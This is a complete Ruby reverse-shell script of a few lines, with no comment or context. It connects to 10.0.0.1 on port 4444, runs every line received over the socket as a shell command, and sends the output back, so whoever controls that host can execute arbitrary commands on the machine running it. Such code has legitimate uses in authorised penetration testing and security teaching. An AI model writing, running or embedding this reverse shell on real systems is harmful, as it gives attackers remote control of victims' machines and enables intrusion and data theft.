require 'socket'
s = TCPSocket.new("10.0.0.1", 4444)
while cmd = s.gets
  IO.popen(cmd, "r") { |io| s.write(io.read) }
end
